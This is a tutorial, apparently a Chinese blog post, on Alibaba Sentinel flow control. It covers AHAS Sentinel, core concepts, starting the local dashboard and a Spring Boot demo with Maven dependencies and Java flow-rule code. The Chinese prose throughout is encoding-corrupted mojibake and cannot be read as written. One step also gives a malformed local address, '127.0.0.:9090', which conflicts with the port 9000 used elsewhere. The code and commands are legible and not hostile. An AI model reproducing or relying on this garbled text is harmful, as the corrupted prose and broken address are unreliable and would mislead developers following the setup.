æ‰©å±•ç‚¹ï¼šSentinel æä¾›ç®€å•æ˜“ç”¨ã€å®Œå–„çš„ SPI æ‰©å±•æ¥å£ã€‚å¯ä»¥é€šè¿‡å®ç°æ‰©å±•æ¥å£æ¥å¿«é€Ÿåœ°å®šåˆ¶é€»è¾‘ï¼Œä¾‹å¦‚å®šåˆ¶è§„åˆ™ç®¡ç†ã€é€‚é…åŠ¨æ€æ•°æ®æºç­‰ Sentinel å¼€æºç”Ÿæ€ AHAS Sentinel æ§åˆ¶å°AHAS Sentinel ç®€ä»‹AHAS Sentinel æ˜¯ Sentinel çš„é˜¿é‡Œäº‘ä¸Šç‰ˆæœ¬ï¼ˆå•†ä¸šç‰ˆï¼‰ï¼Œæä¾›ä¼ä¸šçº§çš„é«˜å¯ç”¨é˜²æŠ¤æœåŠ¡ï¼ŒåŒ…æ‹¬ï¼š å¯é çš„å®æ—¶ç›‘æ§å’Œå†å²ç§’çº§ç›‘æ§æ•°æ®æŸ¥è¯¢ï¼ŒåŒ…å« QPSã€RTã€loadã€CPU ä½¿ç”¨ç‡ç­‰æŒ‡æ ‡ï¼Œæ”¯æŒæŒ‰ç…§è°ƒç”¨ç±»å‹åˆ†ç±»ï¼Œæ”¯æŒåŒæ¯” / ç¯æ¯”å±•ç¤º çƒ­åŠ›å›¾æ¦‚è§ˆï¼Œå¯ä»¥å¿«é€Ÿå®šä½ä¸ç¨³å®šçš„æœºå™¨ åŠ¨æ€è§„åˆ™ç®¡ç† / æ¨é€ï¼Œæ— éœ€è‡ªè¡Œé…ç½®å¤–éƒ¨æ•°æ®æº å‘Šè­¦ä¸­å¿ƒï¼ˆè§¦å‘æµæ§ã€CPU åˆ©ç”¨ç‡é«˜ç­‰äº‹ä»¶ï¼‰ å…¨è‡ªåŠ¨æ‰˜ç®¡ã€é«˜å¯ç”¨çš„é›†ç¾¤æµé‡æ§åˆ¶ é’ˆå¯¹ Istio/Envoy é›†ç¾¤çš„ Mesh é«˜å¯ç”¨é˜²æŠ¤ Nginx ç½‘å…³æµæ§ AHAS Sentinel æ§åˆ¶å°ä½“éªŒè¿™é‡Œåªæ˜¯ç®€å•ä½¿ç”¨ AHAS Sentinel å®˜æ–¹æä¾›çš„ Demo åŒ…æ¥å…¥åˆ° AHAS Sentinel æ§åˆ¶å°ï¼Œè‹¥å¸Œæœ›å°†å·²æœ‰çš„ Sentinel é¡¹ç›®æ¥å…¥åˆ° AHAS Sentinel æ§åˆ¶å°ï¼Œå…·ä½“å¯å‚è€ƒ Sentinel å®˜æ–¹æ–‡æ¡£ã€‚ é˜¿é‡Œäº‘å¼€é€š AHAS æ‰“å¼€ AHAS äº§å“ä¸»é¡µ åœ¨é¡µé¢å³ä¸Šè§’å•å‡»ç™»å½• åœ¨é¡µé¢ä¸Šè¾“å…¥æ‚¨çš„é˜¿é‡Œäº‘è´¦å·å’Œå¯†ç ï¼Œå¹¶å•å‡»ç™»å½• åœ¨äº§å“ä¸»é¡µä¸Šå•å‡»ç”³è¯·å…è´¹å¼€é€šï¼Œç„¶ååœ¨äº‘äº§å“å¼€é€šé¡µé¡µé¢ä¸Šå‹¾é€‰â€ æˆ‘å·²é˜…è¯»å¹¶åŒæ„ã€Šåº”ç”¨é«˜å¯ç”¨æœåŠ¡æœåŠ¡åè®®ã€‹â€ï¼Œå¹¶å•å‡»ç«‹å³å¼€é€š æ¥å…¥æ–°åº”ç”¨ è‹¥åº”ç”¨è¿è¡Œåœ¨éé˜¿é‡Œäº‘ ECS ç¯å¢ƒæˆ–æœ¬åœ°ï¼Œéœ€è¦åœ¨å·¦ä¸Šè§’é€‰æ‹©åˆ‡æ¢å…¬ç½‘ç¯å¢ƒ è·å– Demo åŒ… ç‚¹å‡»æ§åˆ¶å°å·¦ä¾§èœå•æ çš„ åº”ç”¨é˜²æŠ¤ï¼Œæ‰¾åˆ° Tab é¡µé¢é€‰æ‹© JAVA è¯­è¨€ -&gt; ä½“éªŒ Demoï¼Œç„¶åæ ¹æ®é¡µé¢æç¤ºä¸‹è½½ Demo åŒ… å¯åŠ¨ Demo åº”ç”¨ å…¬ç½‘å’Œé˜¿é‡Œäº‘ç»å…¸ç½‘ç»œç¯å¢ƒä¸‹ï¼Œéœ€è¦é¢å¤–æŒ‡å®š License ç”¨äºèº«ä»½æ ¡éªŒï¼ŒVPC ä¸“æœ‰ç½‘ç»œæ— éœ€é…ç½® License 12# å¯åŠ¨å‘½ä»¤$ java -Dahas.namespace=default -Dproject.name=AppName -Dahas.license=xxxxxxxxxxxxx -jar ahas-sentinel-sdk-demo.jar ç­‰å¾…ä¸€ä¼šï¼ŒAHAS Sentinel æ§åˆ¶å°å°±ä¼šæ˜¾ç¤ºç›¸å…³ç›‘æ§æ•°æ® Sentinel åŸºç¡€Sentinel åŸºæœ¬æ¦‚å¿µèµ„æº èµ„æºæ˜¯ Sentinel çš„å…³é”®æ¦‚å¿µã€‚å®ƒå¯ä»¥æ˜¯ Java åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•å†…å®¹ï¼Œä¾‹å¦‚ï¼Œç”±åº”ç”¨ç¨‹åºè‡ªèº«æä¾›çš„æœåŠ¡ï¼Œæˆ–ç”±åº”ç”¨ç¨‹åºè°ƒç”¨çš„å…¶å®ƒåº”ç”¨æä¾›çš„æœåŠ¡ï¼Œç”šè‡³å¯ä»¥æ˜¯ä¸€æ®µä»£ç ã€‚åªè¦é€šè¿‡ Sentinel API å®šä¹‰çš„ä»£ç ï¼Œå°±æ˜¯èµ„æºï¼Œèƒ½å¤Ÿè¢« Sentinel ä¿æŠ¤èµ·æ¥ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æ–¹æ³•ç­¾åï¼ŒURLï¼Œç”šè‡³æœåŠ¡åç§°ä½œä¸ºèµ„æºåæ¥æ ‡ç¤ºèµ„æºã€‚ è§„åˆ™ å›´ç»•èµ„æºçš„å®æ—¶çŠ¶æ€è®¾å®šçš„è§„åˆ™ï¼Œå¯ä»¥åŒ…æ‹¬æµé‡æ§åˆ¶è§„åˆ™ã€ç†”æ–­é™çº§è§„åˆ™ä»¥åŠç³»ç»Ÿä¿æŠ¤è§„åˆ™ã€‚æ‰€æœ‰è§„åˆ™å¯ä»¥åŠ¨æ€å®æ—¶è°ƒæ•´ã€‚ Sentinel è®¾è®¡ç†å¿µæµé‡æ§åˆ¶è®¾è®¡ç†å¿µSentinel æµé‡æ§åˆ¶æœ‰ä»¥ä¸‹å‡ ä¸ªè§’åº¦: è¿è¡ŒæŒ‡æ ‡ï¼Œä¾‹å¦‚ QPSã€çº¿ç¨‹æ± ã€ç³»ç»Ÿè´Ÿè½½ç­‰ æ§åˆ¶çš„æ•ˆæœï¼Œä¾‹å¦‚ç›´æ¥é™æµã€å†·å¯åŠ¨ã€æ’é˜Ÿç­‰ èµ„æºçš„è°ƒç”¨å…³ç³»ï¼Œä¾‹å¦‚èµ„æºçš„è°ƒç”¨é“¾è·¯ï¼Œèµ„æºå’Œèµ„æºä¹‹é—´çš„å…³ç³» ç†”æ–­é™çº§è®¾è®¡ç†å¿µSentinel å’Œ Hystrix çš„åŸåˆ™æ˜¯ä¸€è‡´çš„ï¼Œå³å½“æ£€æµ‹åˆ°è°ƒç”¨é“¾è·¯ä¸­æŸä¸ªèµ„æºå‡ºç°ä¸ç¨³å®šçš„è¡¨ç°ï¼Œä¾‹å¦‚è¯·æ±‚å“åº”æ—¶é—´è¿‡é•¿æˆ–å¼‚å¸¸æ¯”ä¾‹å‡é«˜çš„æ—¶å€™ï¼Œåˆ™å¯¹è¿™ä¸ªèµ„æºçš„è°ƒç”¨è¿›è¡Œé™åˆ¶ï¼Œè®©è¯·æ±‚å¿«é€Ÿå¤±è´¥ï¼Œé¿å…å½±å“åˆ°å…¶å®ƒçš„èµ„æºè€Œå¯¼è‡´çº§è”æ•…éšœã€‚ä½†åœ¨é™åˆ¶çš„æ‰‹æ®µä¸Šï¼ŒSentinel å’Œ Hystrix é‡‡å–äº†å®Œå…¨ä¸ä¸€æ ·çš„æ–¹æ³•ã€‚Hystrix é€šè¿‡çº¿ç¨‹æ± éš”ç¦»çš„æ–¹å¼ï¼Œæ¥å¯¹ä¾èµ–ï¼ˆåœ¨ Sentinel çš„æ¦‚å¿µä¸­å¯¹åº”èµ„æºï¼‰è¿›è¡Œäº†éš”ç¦»ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯èµ„æºå’Œèµ„æºä¹‹é—´åšåˆ°äº†æœ€å½»åº•çš„éš”ç¦»ã€‚ç¼ºç‚¹æ˜¯é™¤äº†å¢åŠ äº†çº¿ç¨‹åˆ‡æ¢çš„æˆæœ¬ï¼ˆè¿‡å¤šçš„çº¿ç¨‹æ± å¯¼è‡´çº¿ç¨‹æ•°ç›®è¿‡å¤šï¼‰ï¼Œè¿˜éœ€è¦é¢„å…ˆç»™å„ä¸ªèµ„æºåšçº¿ç¨‹æ± å¤§å°çš„åˆ†é…ï¼Œå¹¶ä¸”å¯¹äºä¸€äº›ä½¿ç”¨äº† ThreadLocal çš„åœºæ™¯æ¥è¯´ä¼šæœ‰é—®é¢˜ï¼ˆå¦‚ Spring çš„äº‹åŠ¡ï¼‰ã€‚Sentinel å¯¹è¿™ä¸ªé—®é¢˜é‡‡å–äº†ä»¥ä¸‹ä¸¤ç§æ‰‹æ®µæ¥è§£å†³ï¼š é€šè¿‡å¹¶å‘çº¿ç¨‹æ•°è¿›è¡Œé™åˆ¶ å’Œèµ„æºæ± éš”ç¦»çš„æ–¹æ³•ä¸åŒï¼ŒSentinel é€šè¿‡é™åˆ¶èµ„æºå¹¶å‘çº¿ç¨‹çš„æ•°é‡ï¼Œæ¥å‡å°‘ä¸ç¨³å®šèµ„æºå¯¹å…¶å®ƒèµ„æºçš„å½±å“ã€‚è¿™æ ·ä¸ä½†æ²¡æœ‰çº¿ç¨‹åˆ‡æ¢çš„æŸè€—ï¼Œä¹Ÿä¸éœ€è¦æ‚¨é¢„å…ˆåˆ†é…çº¿ç¨‹æ± çš„å¤§å°ã€‚å½“æŸä¸ªèµ„æºå‡ºç°ä¸ç¨³å®šçš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚å“åº”æ—¶é—´å˜é•¿ï¼Œå¯¹èµ„æºçš„ç›´æ¥å½±å“å°±æ˜¯ä¼šé€ æˆçº¿ç¨‹æ•°çš„é€æ­¥å †ç§¯ã€‚å½“çº¿ç¨‹æ•°åœ¨ç‰¹å®šèµ„æºä¸Šå †ç§¯åˆ°ä¸€å®šçš„æ•°é‡ä¹‹åï¼Œå¯¹è¯¥èµ„æºçš„æ–°è¯·æ±‚å°±ä¼šè¢«æ‹’ç»ï¼Œå †ç§¯çš„çº¿ç¨‹å®Œæˆä»»åŠ¡åæ‰å¼€å§‹ç»§ç»­æ¥æ”¶è¯·æ±‚ã€‚ é’ˆå¯¹æ…¢è°ƒç”¨å’Œå¼‚å¸¸å¯¹èµ„æºè¿›è¡Œé™çº§ é™¤äº†å¯¹å¹¶å‘çº¿ç¨‹æ•°è¿›è¡Œæ§åˆ¶ä»¥å¤–ï¼ŒSentinel è¿˜å¯ä»¥æ ¹æ®å“åº”æ—¶é—´å’Œå¼‚å¸¸ç­‰ä¸ç¨³å®šå› ç´ æ¥å¿«é€Ÿå¯¹ä¸ç¨³å®šçš„è°ƒç”¨è¿›è¡Œç†”æ–­ã€‚å½“ä¾èµ–çš„èµ„æºå‡ºç°å“åº”æ—¶é—´è¿‡é•¿åï¼Œæ‰€æœ‰å¯¹è¯¥èµ„æºçš„è®¿é—®éƒ½ä¼šè¢«ç›´æ¥æ‹’ç»ï¼Œç›´åˆ°è¿‡äº†æŒ‡å®šçš„æ—¶é—´çª—å£ä¹‹åæ‰é‡æ–°æ¸è¿›å¼åœ°æ¢å¤ã€‚ ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤ç†å¿µSentinel åŒæ—¶æä¾›ç³»ç»Ÿç»´åº¦çš„è‡ªé€‚åº”ä¿æŠ¤èƒ½åŠ›ã€‚é˜²æ­¢é›ªå´©ï¼Œæ˜¯ç³»ç»Ÿé˜²æŠ¤ä¸­é‡è¦çš„ä¸€ç¯ã€‚å½“ç³»ç»Ÿè´Ÿè½½è¾ƒé«˜çš„æ—¶å€™ï¼Œå¦‚æœè¿˜æŒç»­è®©è¯·æ±‚è¿›å…¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒï¼Œæ— æ³•å“åº”ã€‚åœ¨é›†ç¾¤ç¯å¢ƒä¸‹ï¼Œç½‘ç»œè´Ÿè½½å‡è¡¡ä¼šæŠŠæœ¬åº”è¿™å°æœºå™¨æ‰¿è½½çš„æµé‡è½¬å‘åˆ°å…¶å®ƒçš„æœºå™¨ä¸Šå»ã€‚å¦‚æœè¿™ä¸ªæ—¶å€™å…¶å®ƒçš„æœºå™¨ä¹Ÿå¤„åœ¨ä¸€ä¸ªè¾¹ç¼˜çŠ¶æ€çš„æ—¶å€™ï¼Œè¿™ä¸ªå¢åŠ çš„æµé‡å°±ä¼šå¯¼è‡´è¿™å°æœºå™¨ä¹Ÿå´©æºƒï¼Œæœ€åå¯¼è‡´æ•´ä¸ªé›†ç¾¤ä¸å¯ç”¨ã€‚é’ˆå¯¹è¿™ä¸ªæƒ…å†µï¼ŒSentinel æä¾›äº†å¯¹åº”çš„ä¿æŠ¤æœºåˆ¶ï¼Œè®©ç³»ç»Ÿçš„å…¥å£æµé‡å’Œç³»ç»Ÿçš„è´Ÿè½½è¾¾åˆ°ä¸€ä¸ªå¹³è¡¡ï¼Œä¿è¯ç³»ç»Ÿåœ¨èƒ½åŠ›èŒƒå›´ä¹‹å†…å¤„ç†æœ€å¤šçš„è¯·æ±‚ã€‚ Sentinel æµé‡æ§åˆ¶å…¥é—¨æ¡ˆä¾‹ç‰ˆæœ¬è¯´æ˜æœ¬æ¡ˆä¾‹ä½¿ç”¨çš„ Spring Boot ç‰ˆæœ¬ä¸º 2.1.4.RELEASEï¼ŒSentinel ç‰ˆæœ¬ä¸º 1.8.0ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æœ¬åœ° Sentinel æ§åˆ¶å°æ­å»ºSentinel æä¾›äº†ä¸€ä¸ªè½»é‡çº§çš„å¼€æºæ§åˆ¶å°ï¼Œå®ƒæä¾›æœºå™¨å‘ç°ä»¥åŠå¥åº·çŠ¶å†µç®¡ç†ã€å®æ—¶ç›‘æ§ï¼ˆå•æœºå’Œé›†ç¾¤ï¼‰ï¼Œè§„åˆ™ç®¡ç†å’Œæ¨é€åŠŸèƒ½ ä¸‹è½½ Sentinel æ§åˆ¶å°Sentinel æ§åˆ¶å°ä¸‹è½½æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„ Release ç‰ˆæœ¬ç¨‹åºåŒ…ï¼Œå¦ä¸€ç§æ˜¯ä¸‹è½½ Sentinel æ§åˆ¶å°çš„å·¥ç¨‹æºç ï¼Œåœ¨æœ¬åœ°æ‰“åŒ…åå¯åŠ¨ï¼Œè¿™é‡Œé‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼ 12# ä¸‹è½½å‘½ä»¤$ wget https://github.com/alibaba/Sentinel/releases/download/v1.8.0/sentinel-dashboard-1.8.0.jar å¯åŠ¨ Sentinel æ§åˆ¶å°å¯åŠ¨ Sentinel æ§åˆ¶å°éœ€è¦ä¾èµ– JDK ç‰ˆæœ¬ä¸º 1.8 åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æ§åˆ¶å°ï¼š 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar æµè§ˆå™¨è®¿é—® http://127.0.0.1:9000ï¼Œé»˜è®¤ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ä¸ºï¼šsentinel/sentinel Sentinel æ§åˆ¶å°å¯åŠ¨å‚æ•°è¯´æ˜Sentinel æ§åˆ¶å°å¯åŠ¨æ—¶ï¼Œå¯é…ç½®çš„ JVM å‚æ•°å¦‚ä¸‹ï¼š -Dserver.port æŒ‡å®š Sentinel æ§åˆ¶å°ç›‘å¬çš„ç«¯å£ -Dproject.nameï¼Œè®¾ç½®åº”ç”¨åœ¨ Sentinel æ§åˆ¶å°ä¸­æ˜¾ç¤ºçš„åç§° -Dcsp.sentinel.dashboard.server è®¾ç½®åº”ç”¨éœ€è¦è¿æ¥åˆ°çš„ Sentinel æ§åˆ¶å°çš„ä¸»æœºåœ°å€å’Œç«¯å£å· -Dsentinel.dashboard.auth.password=123456 ç”¨äºæŒ‡å®šæ§åˆ¶å°çš„ç™»å½•å¯†ç ä¸º 123456 -Dsentinel.dashboard.auth.username=sentinel ç”¨äºæŒ‡å®šæ§åˆ¶å°çš„ç™»å½•ç”¨æˆ·åä¸º sentinel -Dserver.servlet.session.timeout=7200 ç”¨äºæŒ‡å®š Spring Boot æœåŠ¡ç«¯ session çš„è¿‡æœŸæ—¶é—´ï¼Œå¦‚ 7200 è¡¨ç¤º 7200 ç§’ï¼›60m è¡¨ç¤º 60 åˆ†é’Ÿï¼Œé»˜è®¤ä¸º 30 åˆ†é’Ÿ ç‰¹åˆ«æ³¨æ„ï¼šSentinel æ§åˆ¶å°å¯åŠ¨æ—¶ï¼Œè‹¥åœ¨ JVM å‚æ•°ä¸­æ·»åŠ äº† -Dproject.name ä¸ -Dcsp.sentinel.dashboard.serverï¼Œé‚£ä¹ˆ Sentinel æ§åˆ¶å°è‡ªèº«ä¹Ÿå¯ä»¥æ³¨å†Œåˆ°å…¶ä»– Sentinel æ§åˆ¶å°ä¸­ï¼ŒSentinel æ§åˆ¶å°ç”šè‡³å¯ä»¥è‡ªå·±ç›‘æ§è‡ªå·±ï¼Œå¯åŠ¨é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1$ java -Dserver.port=9000 -Dcsp.sentinel.dashboard.server=127.0.0.1:9000 -Dproject.name=sentinel-dashboard -jar sentinel-dashboard-1.8.0.jar æ­¤æ—¶æµè§ˆå™¨è®¿é—® http://127.0.0.1:9000ï¼Œå¯ä»¥å‘ç°æ§åˆ¶å°ä¼šå¤šå‡ºä¸€ä¸ª sentinel-dashboard èŠ‚ç‚¹ï¼š æ„å»º Sentinel æœ¬åœ°åº”ç”¨å¼•å…¥ Maven ä¾èµ–ç”±äºéœ€è¦å°†åº”ç”¨æ¥å…¥åˆ° Sentinel æ§åˆ¶å°ï¼Œå› æ­¤å¼•å…¥äº† sentinel-transport-simple-http ä¾èµ– 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;sentinel.version&gt;1.8.0&lt;/sentinel.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;${sentinel.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; æ·»åŠ  Java SDK ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142@RestControllerpublic class HelloController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // ä½¿ç”¨æµæ§è§„åˆ™ try (Entry entry = SphU.entry(RESOURCE_NAME)) { // è¢«ä¿æŠ¤çš„èµ„æº return "Hello Sentinel!"; } catch (Exception e) { // è¢«é™æµ e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."; } } /** * å½“å‰ç±»çš„æ„é€ å‡½æ•°æ‰§è¡Œä¹‹åæ‰§è¡Œæ­¤æ–¹æ³• */ @PostConstruct public void initFlowRules() { // åˆ›å»ºå­˜æ”¾æµæ§è§„åˆ™çš„é›†åˆ List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // åˆ›å»ºæµæ§è§„åˆ™ FlowRule rule = new FlowRule(); // å®šä¹‰èµ„æºï¼Œè¡¨ç¤ºSentinelä¼šå¯¹å“ªä¸ªèµ„æºç”Ÿæ•ˆ rule.setResource(RESOURCE_NAME); // å®šä¹‰æµæ§è§„åˆ™çš„ç±»å‹ rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // å®šä¹‰QPSæ¯ç§’èƒ½é€šè¿‡çš„è¯·æ±‚æ•° rule.setCount(2); // å°†æµæ§è§„åˆ™å­˜æ”¾åœ¨é›†åˆä¸­ rules.add(rule); // åŠ è½½æµæ§è§„åˆ™ FlowRuleManager.loadRules(rules); }} 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} å°†åº”ç”¨è¿æ¥åˆ° Sentinel æ§åˆ¶å°è‹¥åº”ç”¨ç¨‹åºéœ€è¦è¿æ¥åˆ° Sentinel æ§åˆ¶å°ï¼Œ Sentinel æä¾›å¦‚ä¸‹ä¸¤ç§å¸¸ç”¨çš„é…ç½®æ–¹å¼ï¼Œå…·ä½“å¯å‚è€ƒ Sentinel å®˜æ–¹æ–‡æ¡£ä¸­çš„å¯åŠ¨é…ç½®é¡¹ JVM -D å‚æ•°æ–¹å¼ properties æ–‡ä»¶æ–¹å¼ï¼ˆ1.7.0 ç‰ˆæœ¬å¼€å§‹æ”¯æŒï¼‰ è¿™é‡Œé‡‡ç”¨æ·»åŠ  JVM å‚æ•°çš„å¯åŠ¨æ–¹å¼ï¼Œå³å¯åŠ¨åº”ç”¨æ—¶åŠ å…¥ä»¥ä¸‹ JVM å‚æ•°ï¼š -Dproject.name=sentinel-demoï¼Œè®¾ç½®æœ¬åœ°åº”ç”¨åœ¨ Sentinel æ§åˆ¶å°ä¸­æ˜¾ç¤ºçš„åç§° -Dcsp.sentinel.dashboard.server=127.0.0.1:9000ï¼Œè®¾ç½®åº”ç”¨éœ€è¦è¿æ¥åˆ°çš„ Sentinel æ§åˆ¶å°çš„ä¸»æœºåœ°å€å’Œç«¯å£å· æˆ–è€…å°† JVM å‚æ•°æ·»åŠ åˆ° IDEA Configuration é‡Œçš„ VM options ä¸­ï¼š æµ‹è¯•ä»£ç  1ï¼‰å¯åŠ¨æœ¬åœ°çš„ Sentinel æ§åˆ¶å°ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2ï¼‰åœ¨ Spring Boot åº”ç”¨çš„ JVM å‚æ•°ä¸­é…ç½® Sentinel æ§åˆ¶å°ï¼Œç„¶åå¯åŠ¨åº”ç”¨ï¼Œè‹¥æ§åˆ¶å°è¾“å‡ºä»¥ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ Sentinel åŠ è½½æˆåŠŸ 1234INFO: Sentinel log output type is: fileINFO: Sentinel log charset is: utf-8INFO: Sentinel log base directory is: /root/logs/csp/INFO: Sentinel log name use pid is: false ç‰¹åˆ«æ³¨æ„ï¼šå½“ä»£ç é‡Œç¡¬ç¼–ç äº†æµæ§è§„åˆ™ï¼ˆå³ä½¿ç”¨ Java API å®šä¹‰å’ŒåŠ è½½æµæ§è§„åˆ™ï¼‰æ—¶ï¼ŒIDE çš„æ§åˆ¶å°æ‰ä¼šåœ¨åº”ç”¨å¯åŠ¨æ—¶è¾“å‡ºä¸Šé¢ Sentinel ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.:9090ï¼ŒæŸ¥çœ‹ Sentinel æ§åˆ¶å°çš„ç›‘æ§ä¿¡æ¯ï¼›è¿™é‡Œéœ€è¦å…ˆæ‰‹åŠ¨è°ƒç”¨ä¸€æ¬¡ http://127.0.0.1:8080/hello æ¥å£ï¼ŒSentinel æ§åˆ¶å°æ‰ä¼šæ˜¾ç¤ºç›‘æ§æ•°æ® 4ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œåˆ™è¯´æ˜ Sentinel çš„æµæ§è§„åˆ™ç”Ÿæ•ˆäº† åŠ¨æ€é…ç½® Sentinel çš„æµæ§è§„åˆ™åœ¨ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œå°† Sentinel çš„æµæ§è§„åˆ™ç¡¬ç¼–ç åœ¨ Java ä»£ç é‡Œï¼Œä½†åœ¨å®é™…çš„ä¼ä¸šé¡¹ç›®å¼€å‘ä¸­ï¼Œè¿™ç§æ–¹å¼ä¸æ¨èä½¿ç”¨ã€‚åœ¨æ—¥å¸¸æµ‹è¯•å’Œæ¼”ç¤ºä¸­ï¼Œä¸€èˆ¬éƒ½ä¼šåœ¨ Sentinel æ§åˆ¶å°é‡ŒåŠ¨æ€é…ç½®æµæ§è§„åˆ™ï¼Œå› ä¸ºè¿™æ ·ä½¿ç”¨èµ·æ¥æ¯”è¾ƒçµæ´»ã€‚é¦–å…ˆï¼Œå°†ä¸Šè¿°æ¡ˆä¾‹ä¸­æ·»åŠ  Sentinel æµæ§è§„åˆ™çš„ä»£ç æ³¨é‡Šæ‰ï¼ˆç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼‰ï¼Œç„¶ååœ¨ Spring Boot åº”ç”¨çš„ JVM å‚æ•°ä¸­é…ç½® Sentinel æ§åˆ¶å°ã€‚é‡æ–°å¯åŠ¨åº”ç”¨åï¼Œæ­¤æ—¶æ‰“å°çš„å¯åŠ¨æ—¥å¿—ä¿¡æ¯ä¸ä¼šå†æœ‰ Sentinel ç›¸å…³çš„å†…å®¹ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹é€šè¿‡ Sentinel æ§åˆ¶å°åŠ¨æ€æ·»åŠ çš„è§„åˆ™é…ç½®æ˜¯å­˜æ”¾åœ¨å†…å­˜é‡Œçš„ï¼Œå³åŠ¨æ€æ·»åŠ çš„è§„åˆ™é…ç½®åœ¨ Sentinel æ§åˆ¶å°åº”ç”¨é‡å¯åä¼šå¤±æ•ˆã€‚ 123456789101112131415161718192021@RestControllerpublic class HelloController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // ä½¿ç”¨æµæ§è§„åˆ™ try (Entry entry = SphU.entry(RESOURCE_NAME)) { // è¢«ä¿æŠ¤çš„èµ„æº return "Hello Sentinel!"; } catch (Exception e) { // è¢«é™æµ e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."; } }} æµè§ˆå™¨æ‰‹åŠ¨è°ƒç”¨ä¸€æ¬¡ http://127.0.0.1:8080/hello æ¥å£ï¼Œç„¶åæ‰“å¼€ Sentinel æ§åˆ¶å°ï¼ŒåŠ¨æ€æ·»åŠ æµæ§è§„åˆ™ï¼Œè¡¨å•é‡Œçš„èµ„æºåå¿…é¡»ä¸ Java ä»£ç é‡ŒæŒ‡å®šçš„èµ„æºåä¸€è‡´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æµè§ˆå™¨å†æ¬¡è®¿é—® http://127.0.0.1:8080/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œåˆ™è¯´æ˜åŠ¨æ€é…ç½®çš„ Sentinel æµæ§è§„åˆ™ç”Ÿæ•ˆäº† Sentinel å®šä¹‰èµ„æºçš„æ–¹å¼èµ„æºæ˜¯ Sentinel çš„å…³é”®æ¦‚å¿µï¼Œå®ƒå¯ä»¥æ˜¯ Java åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•å†…å®¹ï¼Œä¾‹å¦‚ï¼Œç”±åº”ç”¨ç¨‹åºè‡ªèº«æä¾›çš„æœåŠ¡ï¼Œæˆ–ç”±åº”ç”¨ç¨‹åºè°ƒç”¨çš„å…¶å®ƒåº”ç”¨æä¾›çš„æœåŠ¡ï¼Œç”šè‡³å¯ä»¥æ˜¯ä¸€æ®µä»£ç 